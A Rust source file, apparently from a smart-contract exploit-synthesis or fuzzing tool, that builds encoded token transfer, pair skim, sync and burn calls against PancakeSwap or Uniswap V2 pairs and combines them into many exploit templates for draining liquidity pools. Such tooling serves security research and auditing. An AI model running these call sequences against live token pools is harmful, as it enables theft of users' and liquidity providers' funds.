use std::sync::{Arc, RwLock};
use super::{rawtestcase::{RawTestCase, self}, swap_template::{self, SwapTemplate}, testcase::EVMCall, exploit_template::{ExploitTemplate}};
use ethers::{abi::{Address, ParamType, Token}, solc::{report::BasicStdoutReporter, resolver::print}, types::H160};
use forge::{executor::inspector::oracle::{CageEnv, self}, HashMap};
use foundry_utils::scan::{Scanner, Network};

// Pancake V2 Router Addr: 0x10ED43C718714eb63d5aA57B78B54704E256024E
const BSC_PANCAKE_V2_ROUTER: Address = H160([
    0x10, 0xED, 0x43, 0xC7, 0x18, 0x71, 0x4e, 0xb6, 0x3d, 0x5a, 0xA5, 0x7B, 0x78, 0xB5, 0x47, 0x04,
    0xE2, 0x56, 0x02, 0x4E,
]);

// WBNB addr: 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c
pub const WBNB: Address = H160([
    0xbb, 0x4C, 0xDB, 0x9C, 0xBd, 0x36, 0xB0, 0x1b, 0xD1, 0xcB, 0xaE, 0xBf, 0x2D, 0xe0, 0x8d, 0x91,
    0x73, 0xbc, 0x09, 0x5c,
]);

// Uniswap V2 Router Addr: 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D
pub const ETH_UNISWAP_V2_ROUTER: Address = H160([
    0x7a, 0x25, 0x0d, 0x56, 0x30, 0xB4, 0xcF, 0x53, 0x97, 0x39, 0xdF, 0x2C, 0x5d, 0xAc, 0xb4, 0xc6,
    0x59, 0xF2, 0x48, 0x8D,
]);

// WETH addr: 0xc02aaa39b223fe8d0a0e5c4f27ead9083c756cc2
pub const WETH: Address = H160([
    0xc0, 0x2a, 0xaa, 0x39, 0xb2, 0x23, 0xfe, 0x8d, 0x0a, 0x0e, 0x5c, 0x4f, 0x27, 0xea, 0xd9, 0x08,
    0x3c, 0x75, 0x6c, 0xc2,
]);

#[derive(Debug)]
pub struct Corpus {
    pub base_testcases: Vec<RawTestCase>,
    pub exploit_ingredients: HashMap<String, EVMCall>,
    pub public_burn_function_exists: bool,
    pub public_burn_from_function_exists: bool,
}

impl Corpus {
    pub fn new() -> Self {
        Self {
            base_testcases: Vec::new(),
            exploit_ingredients: HashMap::new(),
            public_burn_function_exists: false,
            public_burn_from_function_exists: false,
        }
    }

    pub fn init(&mut self, scanner: Arc<Scanner>, env: Arc<RwLock<CageEnv>>, bridge_addr: Address) {
        
        let mut writable_cage_env = env.write().unwrap();
        
        let target_token_addr = writable_cage_env.target_token.unwrap();
        let base_token_addr = writable_cage_env.base_token.unwrap();

        let bridge_abi = writable_cage_env.targets.get(&bridge_addr).unwrap().clone();

        // 1. create base_testcase (prefix and suffix swaps)

        // add router to targets
        let (router_addr, wrapped_native_token_addr) = match scanner.network {
            Network::BSC => (BSC_PANCAKE_V2_ROUTER, WBNB),
            Network::ETH => (ETH_UNISWAP_V2_ROUTER, WETH),
        };

        let router_abi = scanner.get_contract_abi(&router_addr).unwrap_or_else(|_| {
            panic!("Could not get contract abi for swap_addr: {:x}", router_addr);
        });
        writable_cage_env.targets.insert(router_addr, router_abi);


        let mut basic_templates = Vec::new();

        if base_token_addr != wrapped_native_token_addr {
            // add wbnb/weth to targets and relevant_token_addrs
            let wrapped_native_token_abi = scanner.get_contract_abi(&wrapped_native_token_addr).unwrap_or_else(|_| {
                panic!("Could not get contract abi for swap_addr: {:x}", wrapped_native_token_addr);
            });
            writable_cage_env.targets.insert(wrapped_native_token_addr, wrapped_native_token_abi);
            writable_cage_env.relevant_token_addrs.push(wrapped_native_token_addr);
        }

        let target_token_to_base_token_template = SwapTemplate::new_token_token_swap(router_addr, target_token_addr, base_token_addr);
        basic_templates.push(target_token_to_base_token_template);

        let empty_tokens = Vec::new();
        let bridge_swap_base_to_target_func = bridge_abi.function("swapBaseTokenToTargetToken").unwrap();
        let bridge_swap_base_to_target_calldata = bridge_swap_base_to_target_func.encode_input(&empty_tokens).unwrap();
        let bridge_swap_base_to_target_call = EVMCall {
            to: bridge_addr,
            value: 0u64.into(),
            name: bridge_swap_base_to_target_func.name.clone(),
            calldata: bridge_swap_base_to_target_calldata,
            args: empty_tokens.clone(),
        };

        let bridge_swap_target_to_base_func = bridge_abi.function("swapTargetTokenToBaseToken").unwrap();
        let bridge_swap_target_to_base_calldata = bridge_swap_target_to_base_func.encode_input(&empty_tokens).unwrap();
        let bridge_swap_target_to_base_call = EVMCall {
            to: bridge_addr,
            value: 0u64.into(),
            name: bridge_swap_target_to_base_func.name.clone(),
            calldata: bridge_swap_target_to_base_calldata,
            args: empty_tokens.clone(),
        };

        drop(writable_cage_env);

        let initial_eth_amount = oracle::THIS_BALANCE;
        let basic_raw_tc = RawTestCase::new(env.clone(), initial_eth_amount, basic_templates);
        self.base_testcases.push(basic_raw_tc);


        let base_tc_with_bridge_swap = RawTestCase {
            initial_eth_amount,
            prefix_swaps: vec![bridge_swap_base_to_target_call],
            suffix_swaps: vec![bridge_swap_target_to_base_call],
            mutable_calls: Vec::new(),
        };
        self.base_testcases.push(base_tc_with_bridge_swap);

        // 2. initialize exploit_ingredients

        let readable_cage_env = env.read().unwrap();
        let main_pier_addr = readable_cage_env.system_addrs.get("main_pier").unwrap().clone();
        let pair_addr = readable_cage_env.pair.unwrap();

        let token_abi = readable_cage_env.targets.get(&target_token_addr).unwrap();
        let pair_abi = readable_cage_env.targets.get(&pair_addr).unwrap();

        // token.transfer(pair, token.balanceOf(this))
        let transfer_func = token_abi.function("transfer").unwrap();
        let transfer_pair_this_balance_tokens = vec![
            Token::Address(pair_addr),
            Token::Uint(oracle::THIS_BALANCE)
        ];
        let transfer_pair_this_balance_calldata = transfer_func.encode_input(&transfer_pair_this_balance_tokens).unwrap();
        let transfer_pair_this_balance_call = EVMCall {
            to: target_token_addr,
            value: 0u64.into(),
            name: transfer_func.name.clone(),
            calldata: transfer_pair_this_balance_calldata,
            args: transfer_pair_this_balance_tokens
        };
        self.exploit_ingredients.insert("this_transfer_pair_this_balance".to_string(), transfer_pair_this_balance_call);

        // token.transfer(pair, token.balanceOf(pair))
        let transfer_pair_pair_balance_tokens = vec![
            Token::Address(pair_addr),
            Token::Uint(oracle::PAIR_BALANCE)
        ];
        let transfer_pair_pair_balance_calldata = transfer_func.encode_input(&transfer_pair_pair_balance_tokens).unwrap();
        let transfer_pair_pair_balance_call = EVMCall {
            to: target_token_addr,
            value: 0u64.into(),
            name: transfer_func.name.clone(),
            calldata: transfer_pair_pair_balance_calldata,
            args: transfer_pair_pair_balance_tokens
        };
        self.exploit_ingredients.insert("this_transfer_pair_pair_balance".to_string(), transfer_pair_pair_balance_call);

        // token.transfer(this, token.balanceOf(this))
        let transfer_this_this_balance_tokens = vec![
            Token::Address(main_pier_addr),
            Token::Uint(oracle::THIS_BALANCE)
        ];
        let transfer_this_this_balance_calldata = transfer_func.encode_input(&transfer_this_this_balance_tokens).unwrap();
        let transfer_this_this_balance_call = EVMCall {
            to: target_token_addr,
            value: 0u64.into(),
            name: transfer_func.name.clone(),
            calldata: transfer_this_this_balance_calldata,
            args: transfer_this_this_balance_tokens
        };
        self.exploit_ingredients.insert("this_transfer_this_this_balance".to_string(), transfer_this_this_balance_call);

        // token.transfer(this, token.balanceOf(pair))
        let transfer_this_pair_balance_tokens = vec![
            Token::Address(main_pier_addr),
            Token::Uint(oracle::PAIR_BALANCE)
        ];
        let transfer_this_pair_balance_calldata = transfer_func.encode_input(&transfer_this_pair_balance_tokens).unwrap();
        let transfer_this_pair_balance_call = EVMCall {
            to: target_token_addr,
            value: 0u64.into(),
            name: transfer_func.name.clone(),
            calldata: transfer_this_pair_balance_calldata,
            args: transfer_this_pair_balance_tokens
        };
        self.exploit_ingredients.insert("this_transfer_this_pair_balance".to_string(), transfer_this_pair_balance_call);

        // token.transfer(this, 0)
        let transfer_this_zero_tokens = vec![
            Token::Address(main_pier_addr),
            Token::Uint(0u64.into())
        ];
        let transfer_this_zero_calldata = transfer_func.encode_input(&transfer_this_zero_tokens).unwrap();
        let transfer_this_zero_call = EVMCall {
            to: target_token_addr,
            value: 0u64.into(),
            name: transfer_func.name.clone(),
            calldata: transfer_this_zero_calldata,
            args: transfer_this_zero_tokens
        };
        self.exploit_ingredients.insert("this_transfer_this_zero".to_string(), transfer_this_zero_call);


        // token.transfer(pair, 0)
        let transfer_pair_zero_tokens = vec![
            Token::Address(pair_addr),
            Token::Uint(0u64.into())
        ];
        let transfer_pair_zero_calldata = transfer_func.encode_input(&transfer_pair_zero_tokens).unwrap();
        let transfer_pair_zero_call = EVMCall {
            to: target_token_addr,
            value: 0u64.into(),
            name: transfer_func.name.clone(),
            calldata: transfer_pair_zero_calldata,
            args: transfer_pair_zero_tokens
        };
        self.exploit_ingredients.insert("this_transfer_pair_zero".to_string(), transfer_pair_zero_call);

        // pair.skim(pair)
        let skim_func = pair_abi.function("skim").unwrap();
        let pair_token = vec![
            Token::Address(pair_addr)
        ];
        let pair_skim_pair_calldata = skim_func.encode_input(&pair_token).unwrap();
        let pair_skim_pair_call = EVMCall {
            to: pair_addr,
            value: 0u64.into(),
            name: skim_func.name.clone(),
            calldata: pair_skim_pair_calldata,
            args: pair_token
        };
        self.exploit_ingredients.insert("pair_skim_pair".to_string(), pair_skim_pair_call);

        // pair.skim(this)
        let this_token = vec![
            Token::Address(main_pier_addr)
        ];
        let pair_skim_this_calldata = skim_func.encode_input(&this_token).unwrap();
        let pair_skim_this_call = EVMCall {
            to: pair_addr,
            value: 0u64.into(),
            name: skim_func.name.clone(),
            calldata: pair_skim_this_calldata,
            args: this_token
        };
        self.exploit_ingredients.insert("pair_skim_this".to_string(), pair_skim_this_call);

        // pair.sync()
        let sync_func = pair_abi.function("sync").unwrap();
        let empty_token = vec![];
        let sync_calldata = sync_func.encode_input(&empty_token).unwrap();
        let sync_call = EVMCall {
            to: pair_addr,
            value: 0u64.into(),
            name: sync_func.name.clone(),
            calldata:sync_calldata,
            args: empty_token
        };
        self.exploit_ingredients.insert("sync".to_string(), sync_call);

        for func in token_abi.functions.iter() {
            if func.0.contains("burn") {
                let mut arguments_generated = true;
                let mut burn_pair_balance_minus_one_tokens: Vec<Token> = Vec::new();
                let mut burn_calculated_amount_tokens = Vec::new();
                let burn_func = token_abi.function(&func.0).unwrap();
                for arg in burn_func.inputs.iter() {
                    if arg.kind == ParamType::Address {
                        let pair_addr = readable_cage_env.pair.unwrap();
                        burn_pair_balance_minus_one_tokens.push(Token::Address(pair_addr));
                        burn_calculated_amount_tokens.push(Token::Address(pair_addr));
                    } else if arg.kind == ParamType::Uint(256) {
                        burn_pair_balance_minus_one_tokens.push(Token::Uint(oracle::PAIR_BALANCE_MINUS_ONE));
                        burn_calculated_amount_tokens.push(Token::Uint(oracle::BURN_AMOUNT));
                    } else {
                        arguments_generated = false;
                        break;
                    }
                }
                if arguments_generated {

                    // burn(pair.balanceOf(pair) - 1)
                    self.public_burn_function_exists = true;
                    let burn_pair_balance_minus_one_calldata = burn_func.encode_input(&burn_pair_balance_minus_one_tokens).unwrap();
                    let burn_pair_balance_minus_one = EVMCall {
                        to: target_token_addr,
                        value: 0u64.into(),
                        name: burn_func.name.clone(),
                        calldata: burn_pair_balance_minus_one_calldata,
                        args: burn_pair_balance_minus_one_tokens,
                    };
                    self.exploit_ingredients.insert("burn_pair_balance_minus_one".to_string(), burn_pair_balance_minus_one);
                    
                    // calculateBurnAmount()
                    let bridge_calculate_burn_amount_func = bridge_abi.function("calculateBurnAmount").unwrap();
                    let bridge_calculate_burn_amount_calldata = bridge_calculate_burn_amount_func.encode_input(&vec![]).unwrap();
                    let bridge_calculate_burn_amount_call = EVMCall {
                        to: bridge_addr,
                        value: 0u64.into(),
                        name: bridge_calculate_burn_amount_func.name.clone(),
                        calldata: bridge_calculate_burn_amount_calldata,
                        args: vec![],
                    };
                    self.exploit_ingredients.insert("bridge_calculate_burn_amount_call".to_string(), bridge_calculate_burn_amount_call);

                    // burn(calculatedAmount)
                    let burn_calculated_amount_callata = burn_func.encode_input(&burn_calculated_amount_tokens).unwrap();
                    let burn_calculated_amount = EVMCall {
                        to: target_token_addr,
                        value: 0u64.into(),
                        name: burn_func.name.clone(),
                        calldata: burn_calculated_amount_callata,
                        args: burn_calculated_amount_tokens,
                    };
                    self.exploit_ingredients.insert("burn_calculated_amount".to_string(), burn_calculated_amount);

                }
            }
        }

    }

    pub fn get_basic_exploit_templates(&self) -> Vec<ExploitTemplate> {
        
        let mut exploit_templates = Vec::new();

        let this_transfer_pair_this_balance = self.exploit_ingredients.get("this_transfer_pair_this_balance").unwrap();
        let pair_skim_pair = self.exploit_ingredients.get("pair_skim_pair").unwrap();
        let pair_skim_this = self.exploit_ingredients.get("pair_skim_this").unwrap();
        let this_transfer_this_this_balance = self.exploit_ingredients.get("this_transfer_this_this_balance").unwrap();
        let this_transfer_pair_pair_balance = self.exploit_ingredients.get("this_transfer_pair_pair_balance").unwrap();
        let this_transfer_this_pair_balance = self.exploit_ingredients.get("this_transfer_this_pair_balance").unwrap();
        let this_transfer_this_zero = self.exploit_ingredients.get("this_transfer_this_zero").unwrap();
        let this_transfer_pair_zero = self.exploit_ingredients.get("this_transfer_pair_zero").unwrap();

        let initial_swap_amounts = vec![1u64, 2u64, 3u64, 4u64, 5u64, 6u64, 7u64, 8u64, 9u64, 10u64,
             15u64, 20u64, 25u64, 30u64, 35u64, 40u64, 45u64, 50u64, 55u64, 60u64, 65u64, 70u64, 75u64, 80u64, 85u64, 90u64, 95u64, 99u64];

        for initial_swap_amount in initial_swap_amounts {

            /* ZERO balance cycles */

            // token.transfer(pair, 0) & pair.skim(pair) & pair.skim(this)
            let cycle_pair_zero = ExploitTemplate {
                initial_token_percent: initial_swap_amount.into(),
                prefix_calls: vec![this_transfer_pair_zero.clone()],
                repeated_calls: vec![pair_skim_pair.clone()],
                suffix_calls: vec![pair_skim_this.clone()],
            };
            exploit_templates.push(cycle_pair_zero);

            // token.transfer(pair, 0) & pair.skim(pair)
            let cycle_pair_zero_opt = ExploitTemplate {
                initial_token_percent: initial_swap_amount.into(),
                prefix_calls: vec![this_transfer_pair_zero.clone()],
                repeated_calls: vec![pair_skim_pair.clone()],
                suffix_calls: vec![],
            };
            exploit_templates.push(cycle_pair_zero_opt);

            // token.transfer(pair, 0) & pair.skim(this)
            let cycle_this_pair_zero = ExploitTemplate {
                initial_token_percent: initial_swap_amount.into(),
                prefix_calls: vec![],
                repeated_calls: vec![this_transfer_pair_zero.clone(), pair_skim_this.clone()],
                suffix_calls: vec![],
            };
            exploit_templates.push(cycle_this_pair_zero);

            // token.transfer(this, 0)
            let cycle_this_zero = ExploitTemplate {
                initial_token_percent: initial_swap_amount.into(),
                prefix_calls: vec![],
                repeated_calls: vec![this_transfer_this_zero.clone()],
                suffix_calls: vec![],
            };
            exploit_templates.push(cycle_this_zero);

            if initial_swap_amount >= 50u64 {

                /* PAIR balance cycles */

                // token.transfer(pair, token.balanceOf(pair)) & pair.skim(pair) & pair.skim(this)
                let cycle_pair_pair = ExploitTemplate {
                    initial_token_percent: initial_swap_amount.into(),
                    prefix_calls: vec![this_transfer_pair_pair_balance.clone()],
                    repeated_calls: vec![pair_skim_pair.clone()],
                    suffix_calls: vec![pair_skim_this.clone()],
                };
                exploit_templates.push(cycle_pair_pair);

                // token.transfer(pair, token.balanceOf(pair)) & pair.skim(pair)
                let cycle_pair_pair_opt = ExploitTemplate {
                    initial_token_percent: initial_swap_amount.into(),
                    prefix_calls: vec![this_transfer_pair_pair_balance.clone()],
                    repeated_calls: vec![pair_skim_pair.clone()],
                    suffix_calls: vec![],
                };
                exploit_templates.push(cycle_pair_pair_opt);

                // token.transfer(pair, token.balanceOf(pair)) & pair.skim(this)
                let cycle_this_pair_pair  = ExploitTemplate {
                    initial_token_percent: initial_swap_amount.into(),
                    prefix_calls: Vec::new(),
                    repeated_calls: vec![this_transfer_pair_pair_balance.clone(), pair_skim_this.clone()],
                    suffix_calls: Vec::new(),
                };
                exploit_templates.push(cycle_this_pair_pair);
    
                // token.transfer(this, token.balanceOf(pair))
                let cycle_this_pair = ExploitTemplate {
                    initial_token_percent: initial_swap_amount.into(),
                    prefix_calls: Vec::new(),
                    repeated_calls: vec![this_transfer_this_pair_balance.clone()],
                    suffix_calls: Vec::new(),
                };
                exploit_templates.push(cycle_this_pair);
            }

            /* THIS balance cycles */

            // token.transfer(pair, token.balanceOf(this)) & pair.skim(pair) & pair.skim(this)
            let cycle_pair_this = ExploitTemplate {
                initial_token_percent: initial_swap_amount.into(),
                prefix_calls: vec![this_transfer_pair_this_balance.clone()],
                repeated_calls: vec![pair_skim_pair.clone()],
                suffix_calls: vec![pair_skim_this.clone()],
            };
            exploit_templates.push(cycle_pair_this);
    
            // token.transfer(pair, token.balanceOf(this)) & pair.skim(pair)
            let cycle_pair_this_opt = ExploitTemplate {
                initial_token_percent: initial_swap_amount.into(),
                prefix_calls: vec![this_transfer_pair_pair_balance.clone()],
                repeated_calls: vec![pair_skim_pair.clone()],
                suffix_calls: vec![],
            };
            exploit_templates.push(cycle_pair_this_opt);

            // token.transfer(pair, token.balanceOf(this)) & pair.skim(this)
            let cycle_this_pair_this  = ExploitTemplate {
                initial_token_percent: initial_swap_amount.into(),
                prefix_calls: Vec::new(),
                repeated_calls: vec![this_transfer_pair_this_balance.clone(), pair_skim_this.clone()],
                suffix_calls: Vec::new(),
            };
            exploit_templates.push(cycle_this_pair_this);

            // token.transfer(this, token.balanceOf(this))
            let cycle_this_this = ExploitTemplate {
                initial_token_percent: initial_swap_amount.into(),
                prefix_calls: Vec::new(),
                repeated_calls: vec![this_transfer_this_this_balance.clone()],
                suffix_calls: Vec::new(),
            };
            exploit_templates.push(cycle_this_this);

            if self.public_burn_function_exists {

                /* BURN functions */

                let bridge_calculate_burn_amount_call = self.exploit_ingredients.get("bridge_calculate_burn_amount_call").unwrap();
                let burn_calculated_amount = self.exploit_ingredients.get("burn_calculated_amount").unwrap();
                let burn_pair_balance_minus_one = self.exploit_ingredients.get("burn_pair_balance_minus_one").unwrap();

                let burn_pair_minus_one = ExploitTemplate {
                    initial_token_percent: initial_swap_amount.into(),
                    prefix_calls: Vec::new(),
                    repeated_calls: vec![burn_pair_balance_minus_one.clone()],
                    suffix_calls: Vec::new(),
                };
                exploit_templates.push(burn_pair_minus_one);

                let burn_calculated_amount = ExploitTemplate {
                    initial_token_percent: initial_swap_amount.into(),
                    prefix_calls: Vec::new(),
                    repeated_calls: vec![bridge_calculate_burn_amount_call.clone(), burn_calculated_amount.clone()],
                    suffix_calls: Vec::new(),
                };
                exploit_templates.push(burn_calculated_amount);
            }

        }

        exploit_templates
    }


}